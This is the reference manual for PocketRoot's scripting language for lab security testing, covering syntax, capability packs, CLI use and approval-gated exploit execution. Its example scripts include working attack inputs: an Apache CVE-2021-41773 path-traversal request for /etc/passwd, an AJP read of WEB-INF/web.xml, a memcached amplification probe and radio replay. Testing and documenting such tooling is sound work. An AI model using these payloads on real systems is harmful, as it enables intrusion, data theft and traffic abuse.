# Script DSL reference

Schema identifier: `pocketroot.script.v1`.

The parser, validator and compiler are implemented in this repository
(`services/script.zig`, `services/script_builder.zig`). No Lua runtime, garbage
collector or standard library is embedded; only the block syntax style is borrowed.

## 1. Example

```lua
script "replay-subghz" do
    use "pack.rf"

    budget { time = "10s", steps = 500, tx = 2 }

    cap rf_capture = subghz.read
    cap rf_tx      = subghz.transmit { region = from_policy }

    step "capture" do
        sig = rf_capture { payload = "protocol=Princeton" }
        if sig.protocol == "Princeton" then
            rf_tx { payload = sig.protocol, on_error = "continue" }
            emit finding {
                severity = "info",
                message  = "replayed princeton frame",
                tag      = sig.protocol
            }
        else
            emit info "unsupported protocol"
            stop
        end
    end
end
```

## 2. Syntax rules

| Item | Rule |
|---|---|
| Blocks | `do ... end`; `if ... then ... elseif ... else ... end`; `for i = 1, N do ... end` |
| Comments | `--` to end of line; no block comments |
| Statement separator | Newline; an optional `;` is accepted |
| Strings | Double quotes; no escape sequences (the next `"` ends the string); no long-bracket strings |
| Option values | String, number, `true`/`false`, `from_policy`, or a variable reference (`sig`, `sig.field`) |
| Identifiers | `[A-Za-z_][A-Za-z0-9_]*` |
| Loops | Bounded numeric `for` only; `N` must be a literal in `1..64`; no `while` |
| Functions | No user-defined functions |
| Indentation | Not significant |
| Comparison | `==`, `~=`, `<`, `<=`, `>`, `>=`; connectors `and`, `or`; prefix `not` |

## 3. Execution model

The DSL compiles to `workflow.Definition`; it is not a second executor.

```
script(file) -> lex/parse -> AST -> validate -> workflow.Definition (+ action and condition specs)
                                                        |
                                                        v
                                       workflow.Runner (retries, conditions, checkpoints, cancel)
                                                        |
                                                        v
                                       automation.Engine -> capability.Service
                                                        |
                                                        v
                                             hardware backend or simulated backend
```

Retries, checkpoints, cancellation and auditing are the existing workflow and capability
implementations. `if` becomes condition steps with trampoline jumps, and `for` is
unrolled at compile time.

## 4. Capability binding

Every verb becomes a `capability.Request` (see
[`architecture/contracts.md`](../architecture/contracts.md)):

| DSL verb | Kind and operation | Active authorisation |
|---|---|---|
| `subghz.read`, `nfc.read`, `ir.receive`, `lfrfid.read`, `ibutton.read`, `net.capture`, `net.tls`, `net.scan`, `net.http`, `net.udp`, `net.tcp`, `net.ajp`, `fs.read` | matching kind with `read`/`capture`/`analyze` | no |
| `subghz.transmit` | `subghz` + `transmit` | yes, with matching region |
| `ir.transmit` | `infrared` + `transmit` | yes |
| `nfc.emulate` | `nfc` + `emulate` | yes |
| `fs.write` | `storage` + `write` | yes |
| unregistered verb | none | rejected at parse time (`UnknownVerb`) |

## 5. Packs

`use` declares the capability surface a script may touch. Every verb belongs to exactly
one pack:

| Pack | Verbs |
|---|---|
| `pack.rf` | `subghz.read`, `subghz.transmit`, `lfrfid.read`, `ibutton.read` |
| `pack.nfc` | `nfc.read`, `nfc.emulate` |
| `pack.ir` | `ir.receive`, `ir.transmit` |
| `pack.net` | `net.capture`, `net.tls`, `net.scan`, `net.http`, `net.udp`, `net.tcp`, `net.ajp` |
| `pack.exploit` | `exploit.plan`, `exploit.execute`, `exploit.adaptive` |
| `pack.fs` | `fs.read`, `fs.write` |

A `cap` whose pack was not imported fails with `PackNotImported`; an unknown pack fails
with `UnknownPack`; a verb without a pack fails with `UnknownVerb`.

## 6. Semantics

| Item | Behaviour |
|---|---|
| `on_error` | `"abort"`, `"continue"` or `"retry(n)"`; retry reuses the workflow attempt counter |
| `fail "message"` | a deliberate failure: emits an `error` finding, fails the step and stops the run |
| `net.http` | raw HTTP/1.1 request: `target`, `method`, `path`, `path_suffix`, `headers`, `body`, `body_file`, `body_ref`, `timeout`, `capture_name`, `capture_prefix`, `capture_suffix`, `capture_prefix_hex`, `capture_suffix_hex`, `expect_status`, `expect_body`, `expect_absent`, `expect_location_prefix`; the result binds `status`, `status_line`, `headers_prefix`, `location`, `body_bytes`, `body_prefix`, `captured`, `capture_found`, `oracle`, `oracle_reason` |
| `net.udp` | one datagram: `target`, `data`, `timeout`, `expect_min_bytes`, `expect_body`, `expect_absent`; the result binds `bytes`, `ratio`, `body_prefix`, `oracle`, `oracle_reason` |
| `net.tcp` | one raw TCP payload: `target`, `data`, `timeout`; the result binds `bytes`, `body_prefix` |
| `net.ajp` | one AJP13 request: `target`, `method`, `uri`, `server_port`, `attributes` (`name=value;name=value`), `timeout`; the result binds `status`, `bytes`, `body_prefix` |
| `exploit.plan` | passive chain analysis: `observations` or `surface`, `records`, `target`; the result binds the `pocketroot.chain.v1` JSON |
| `exploit.execute` | active, campaign-gated chain execution: `plan`, `campaign`; the result binds `pocketroot.chain.evidence.v1` |
| `exploit.adaptive` | active, campaign-gated output-driven goal: `goal`, `campaign`; the result binds `pocketroot.adaptive.evidence.v1` |
| `expect_*` | These options feed the **oracle**; they do not fail the action. An admitted script must check the result, e.g. `if r.oracle ~= "pass" then fail "..." end`. |
| Scoping | `sig = ...` is local to the step; crossing steps requires `out <name>` |
| Variables | A successful call binds its result payload as `name` and, for each `key=value` line, as `name.key` |
| References | `payload`, `severity`, `message`, `tag` and `note` accept a variable reference. The root must be visible at parse time; a path that is visible but has no runtime field fails the step with `UnresolvedReference` instead of sending or emitting an empty value |
| Conditions | A comparison references a variable assigned earlier in the same step, or one exported with `out`. Comparing two variables and mixing `and` with `or` are rejected with `UnsupportedCondition` |
| `stop` | Ends the enclosing statement list; later statements are not compiled |
| `emit` | Records a finding without contacting the capability service; fields may be literals or references |

## 7. Sub-scripts

```lua
-- helper.pk
script "helper" do
    use "pack.rf"
    cap rf = subghz.read
    step "capture" do
        sig = rf { payload = "protocol=Princeton" }
        out sig
    end
end

-- caller.pk
script "caller" do
    use "pack.rf"
    use "script:helper"
    step "decide" do
        run "helper"
        if sig.protocol == "Princeton" then
            rf { payload = "match" }
        end
    end
end
```

- `run` inlines the sub-script's steps at the call site, so retries, checkpoints and audit
  remain one workflow run. Inlined steps are audited under `script:<sub-script name>`.
- A sub-script's `out` names become visible in the caller at the `run` statement.
- `use "script:<name>"` and `run` require a `Library` at parse time
  (`script.parseWithLibrary`); a plain `parse` reports `UnknownScript`.
- A library must exist before the caller is parsed, so a cycle cannot be constructed;
  the compiler still enforces a depth limit of 8.

## 8. Running from the CLI

```
PocketRoot.exe script run [--lib a.pk,b.pk] [--authorize-active] [--region <id>] <file.pk>
```

- `--lib` takes a comma-separated list, parsed in order; a later library script may use an
  earlier one. A forward reference fails with `UnknownScript`.
- A library entry is named by the `script "<name>"` declaration, not by the file name.
- Without `--authorize-active`, active operations are denied and the script ends failed
  with exit code 1.
- Output is the final status, one audit line per request (subject, kind, operation,
  status) and every emitted finding.

```
$ PocketRoot.exe script run --lib helper.pk caller.pk
script "caller" succeeded
audit: 2
  1 script:helper subghz read succeeded
  2 script:caller subghz read succeeded
```

The execution backend is the simulator (`simulator/device.zig`), so the command
demonstrates compilation, execution, audit and gating; it does not drive hardware.

## 9. Limits

| Limit | Value |
|---|---|
| Script size | 256 KiB |
| Statements per step | 512 |
| Steps | 256 |
| `use` declarations | 16 |
| `cap` declarations | 128 |
| Options per call | 32 |
| Name length | 128 bytes |
| Text length | 1024 bytes |
| Loop bound | 64 |
| `budget.time` | 10 minutes |
| Sub-script nesting | 8 |

## 10. Verifying a catalogue entry

`net.scan` returns the recorded observation for a lab target when the payload names it,
so a script can decide from data instead of from constants:

```lua
script "verify-cve-2021-41773" do
    use "pack.net"
    cap scan = net.scan
    step "lookup" do
        observation = scan { payload = "target=lab-apache-249.lan:18080" }
        out observation
        if observation.version == "2.4.49" then
            emit finding {
                severity = "critical",
                message = "CVE-2021-41773 applies: Apache 2.4.49 path traversal"
            }
        else
            emit info "version does not match the reproduced build"
        end
    end
end
```

The four CVE scripts in `samples/scripts/` cover the entries that the catalogue repository
reproduced in Docker (CVE-2021-41773, CVE-2021-42013, CVE-2024-31449 and the inconclusive
CVE-2026-44631). Observations come from `src/simulator/fixtures.zig`; they are recorded
values, not live traffic, and the targets are synthetic names.

`emit` fields accept literals or variable references (see section 6), so a finding can carry a value observed in the same step. A reference whose field does not exist fails the step rather than emitting an empty field.

The catalogue repository runs these scripts, then the matcher, and compares both results
with the reproduction evidence:

```powershell
PocketRootVulnerabilityDb/tools/Invoke-CapabilityCheck.ps1              # recorded observations
PocketRootVulnerabilityDb/tools/Invoke-CapabilityCheck.ps1 -Live        # plus a real probe
PocketRootVulnerabilityDb/tools/Invoke-CapabilityCheck.ps1 -Live -WithDocker
```

### Live scanning

`net.scan` reads the recorded observation unless the run asks for a probe; `net.http` always needs `--live`:

```powershell
zig-out/bin/PocketRoot script run --live samples/scripts/live-scan.pk
zig-out/bin/PocketRoot script run --live --dump-vars samples/scripts/live-scan.pk
```

The same payload drives both modes (`target=host:port`), and the result has the same
`key=value` shape:

```
host=127.0.0.1
port=8080
state=open
transport=tcp
service=http
product=Apache
version=2.4.54
```

Live mode uses the TCP scanner, so protocol probes only run for the ports it knows
(80, 443, 6379, 8080, 3306, 5432 and the other documented defaults). A host mapped to an
unusual port connects successfully but reports no product or version. `--dump-vars`
prints every bound variable and is intended for diagnostics, not for evidence.

## 10.5 TCP, AJP and body references

`net.tcp` sends one payload and reads until EOF/timeout. `net.ajp` builds a generic AJP13
request from `method`, `uri`, `server_port` and semicolon-separated `attributes`:

```lua
script "ajp-read" do
    use "pack.net"
    cap read = net.ajp
    step "read" do
        r = read { target = "127.0.0.1:8009",
                   attributes = "javax.servlet.include.path_info=/WEB-INF/web.xml" }
        emit finding { severity = "info", message = r.status }
    end
end
```

`net.http` accepts `body_file` for a request body loaded from a local file, `path_suffix`
to append a captured value to a path, `body_ref`/`body_prefix` to compose a body, and
`capture_prefix_hex`/`capture_suffix_hex` when a delimiter contains quotes or binary bytes.
The CVE-2018-7600 and CVE-2026-58415 scripts use these generic options.

## 11. Raw HTTP reproduction scripts

`net.http` sends the request bytes unchanged: no client normalisation, no redirect
following. A call site carries the request and its oracle:

```lua
script "cve-2021-41773-probe" do
    use "pack.net"
    cap probe = net.http

    step "probe" do
        response = probe {
            target = "127.0.0.1:8080",
            method = "GET",
            path = "/cgi-bin/.%2e/.%2e/.%2e/.%2e/etc/passwd",
            expect_status = 200,
            expect_body = "root:x:0:0",
        }
        if response.oracle ~= "pass" then
            fail "CVE-2021-41773 was not observed"
        end
        emit finding { severity = "critical", message = "path traversal returned /etc/passwd" }
    end
end
```

The backend returns `succeeded` with `oracle=pass|fail` so the script can decide with
`fail`; transport and parse errors return `failed`. `fail` appends an error finding and
ends the workflow as failed. The `reproduce` command renders `{{target}}`, runs a script
live and writes `pocketroot.reproduction.evidence.v1`; see
[reproductions](reproductions.md).

## 12. Datagram probes

`net.udp` sends one datagram and waits for one response. It is the primitive for
amplification and reflection checks: the oracle can require a minimum response size,
a marker in the payload, or the absence of a marker.

```lua
script "udp-amplification" do
    use "pack.net"
    cap probe = net.udp
    step "probe" do
        response = probe {
            target = "127.0.0.1:11211",
            data = "stats\r\n",
            expect_min_bytes = 16,
        }
        if response.oracle ~= "pass" then
            fail "no amplified datagram observed"
        end
        emit finding { severity = "medium", message = "datagram amplification observed", tag = response.bytes }
    end
end
```

The report includes `ratio` (response bytes divided by request bytes); a response at or
above the requested minimum is only a hint, not proof of spoofability.

## 13. Capturing a value

`net.http` can capture a substring between two literal delimiters and expose it as
`captured`. A later call can use the captured value as a bound field:

```lua
script "capture" do
    use "pack.net"
    cap probe = net.http
    step "chain" do
        first = probe {
            target = "127.0.0.1:8080",
            path = "/poison",
            capture_name = "next",
            capture_prefix = "next=",
            capture_suffix = ";",
        }
        second = probe {
            target = "127.0.0.1:8080",
            path = first.captured,
            expect_body = "ok",
        }
        out second
    end
end
```

The DSL captures values for scripts and simple chains. Multi-step exploit chains with
command execution and effect evidence belong to `pocketroot.exploit.v1` and
`chain plan/run`, which also carry the approval and record-digest checks.

**Limit:** DSL strings have no escape syntax, so a delimiter that itself contains `"`
cannot be expressed in a `capture_prefix`/`capture_suffix`; use the JSON exploit record
for those protocols.

## 14. Kernel exploit-chain analysis

`exploit.plan` is a kernel capability (`exploit` / `analyze`), not a network
request. It reads observations or a surface report, matches exploit records and returns a
`pocketroot.chain.v1` plan. It sends no traffic and needs no approval; execution still
goes through `chain approve` + `chain run`.

```lua
script "plan" do
    use "pack.exploit"
    cap plan = exploit.plan
    step "plan" do
        result = plan {
            surface = "samples/campaign/surface-lab.json",
            records = "samples/exploits",
        }
        out result
    end
end
```

The audit line is `exploit analyze`; the plan is bound as a variable, so a script can
inspect its id/steps before a human approval.

### 14.1 Executing a chain from a script

`exploit.execute` maps to `Kind.exploit` + `Operation.manage` (active). The script must
run with `--authorize-active`, and the plan must already have a live campaign approval:

```lua
script "run-chain" do
    use "pack.exploit"
    cap exec = exploit.execute
    step "run" do
        result = exec {
            plan = "chain.json",
            campaign = ".pocketroot",
        }
        out result
    end
end
```

The audit line is `exploit manage`; a missing/used/expired approval is audited as
`denied`, not as a successful script. The kernel does not mint approvals.

### 14.2 Adaptive goals

`exploit.adaptive` executes a `pocketroot.adaptive.v1` goal. Modules declare
`requires` facts, `inputs` and `outputs`; the runner selects the next module from the
facts produced by the previous output instead of following a fixed step list.

```lua
script "adaptive" do
    use "pack.exploit"
    cap adv = exploit.adaptive
    step "run" do
        result = adv { goal = "goal.json", campaign = ".pocketroot" }
        out result
    end
end
```

It is active, so run with `--authorize-active`; the handler still requires a live
`campaign approve-adaptive` approval. See [adaptive](adaptive.md).

## 12. Exploit execution gate

`script run --live` is the lab/recon path: it executes the DSL without a campaign
approval, and it refuses paths under `samples/exploits/`. An admitted exploit uses the
generic gate instead:

```bash
PocketRoot campaign approve-script samples/exploits/CVE-2024-38475/exploit.pk \\
    --target 127.0.0.1:8080 --reason "ticket DSL-1" --confirm cve-2024-38475
PocketRoot exploit run-script samples/exploits/CVE-2024-38475/exploit.pk \\
    --campaign .pocketroot --target 127.0.0.1:8080 --evidence dsl.json
```

The gate binds the exact script bytes and target, consumes one single-use approval, writes
`dsl-start`/`dsl-result` ledger events, and checks STOP before every workflow tick. The
HTTP, UDP, TCP and AJP probes also receive the same stop check and poll it while waiting for
a response, so an in-flight request is aborted. The
evidence schema is `pocketroot.dsl.evidence.v1`, containing the script hash, target,
approval id, audit entries and emitted findings. The command still uses `net.*` capabilities;
the gate is around the whole script, not a CVE-specific branch.
